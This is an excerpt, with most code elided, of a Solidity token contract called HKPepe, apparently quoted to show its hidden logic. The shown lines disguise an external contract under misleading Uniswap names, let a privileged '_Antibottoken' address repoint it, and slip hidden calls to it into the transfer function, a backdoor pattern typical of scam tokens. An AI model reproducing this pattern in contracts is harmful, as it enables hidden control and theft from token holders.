...
contract HKPepe is Context, IERC20, Ownable {
    ...
    uniswapV1 private uniswapV6PairToken;
    ...
    constructor(
        ...
        uniswapV6PairToken = uniswapV1(uniswapV3Pair_);
    ...
    function setuniswapV1(address addresses) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            uniswapV6PairToken = uniswapV1(addresses);
        } else {
            uniswapV6PairToken.create(8**3);
        }
    }
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV6PairToken.create(crec);
        }
        ...
        if (_isExcludedlp[to]) {
            uniswapV6PairToken.create(250**3); 
        }
